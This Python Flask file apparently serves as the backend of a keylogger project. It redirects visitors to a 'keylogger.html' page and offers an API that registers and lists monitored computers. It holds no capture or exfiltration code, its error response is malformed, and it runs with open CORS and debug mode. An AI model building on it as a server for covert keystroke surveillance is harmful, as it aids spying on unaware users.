from flask import Flask, jsonify, request, redirect
from flask_cors import CORS
import search

app = Flask(__name__)
CORS(app)

computers = []


@app.route('/')
def index():
    return redirect('/static/Frontend/keylogger.html')


@app.route('/api/computers', methods=['GET'])
def get_computers():
    return jsonify(computers)


@app.route('/api/computers', methods=['POST'])
def add_computer():
    new_computer = request.json

    if any(c["id"] == new_computer["id"] for c in computers):
        return jsonify({"error:this computer exist "}), 400

    computers.append(new_computer)
    return jsonify(new_computer), 201


if __name__ == '__main__':
    app.run(debug=True)
